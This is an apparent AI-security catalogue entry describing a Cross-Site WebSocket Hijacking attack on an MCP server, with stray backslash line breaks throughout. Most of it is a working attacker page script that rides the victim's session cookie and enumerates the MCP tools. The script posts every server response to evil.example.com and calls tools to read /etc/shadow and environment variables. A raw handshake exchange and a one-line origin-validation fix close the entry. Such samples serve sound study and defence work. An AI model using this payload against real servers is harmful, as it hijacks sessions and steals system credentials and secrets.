content:
# DojoLM\
AI\
Security - WebSocket Origin Bypass

**Category:**\
WebMCP WebSocket Hijacking\
(CSWSH)
**Severity:** CRITICAL

---

A Cross-Site\
WebSocket Hijacking\
attack\
where an attacker's page opens\
a WebSocket to the\
MCP server, exploiting\
missing\
origin\
validation:

Attacker's page at https://evil.example.com/hijack.html:
<script>
// Cross-Site WebSocket Hijacking (CSWSH)
// The victim's\
browser sends cookies with the\
WebSocket\
handshake
var ws = new WebSocket('wss://mcp-api.example.com/ws/mcp');

ws.onopen = function() {
  console.log('WebSocket connected to MCP server with victim cookies');

\
\
// Enumerate available\
tools
 \
ws.send(JSON.stringify({
   \
jsonrpc:\
'2.0',
 \
  method: 'tools/list',
\
 \
 id: 1
 \
}));
};

ws.onmessage =\
function(event)\
{
\
 var data = JSON.parse(event.data);

\
 // Exfiltrate tool list
 \
fetch('https://evil.example.com/ws-collect', {
    method:\
'POST',
    body: event.data
\
\
});

  //\
If\
we\
got\
the tool list, start invoking tools
\
 if (data.id === 1 && data.result)\
{
\
   // Read sensitive files
\
   ws.send(JSON.stringify({
\
 \
   jsonrpc: '2.0',
\
     method: 'tools/call',
\
   \
 params: {
       \
name:\
'filesystem_read',
       \
arguments:\
{ path: '/etc/shadow'\
}
   \
 \
},
   \
  id:\
2
   \
}));

\
   // Read\
environment variables
    ws.send(JSON.stringify({
\
     jsonrpc:\
'2.0',
 \
    method: 'tools/call',
     \
params: {
   \
  \
\
name: 'env_read',
\
 \
    \
arguments: {}
  \
   },
   \
  id: 3
    }));
  }
};
</script>

WebSocket handshake (sent\
by victim's browser):
GET\
/ws/mcp HTTP/1.1
Host: mcp-api.example.com
Upgrade: websocket
Connection: Upgrade
Origin:\
https://evil.example.com
Cookie: mcp_session=victim_authenticated_session_token
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

Vulnerable server response (does not check Origin):
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=

INSTRUCTION: This\
demonstrates CSWSH\
via missing origin validation.\
MCP\
WebSocket endpoints must validate the Origin\
header against a whitelist of trusted origins and reject connections\
from unauthorized domains.
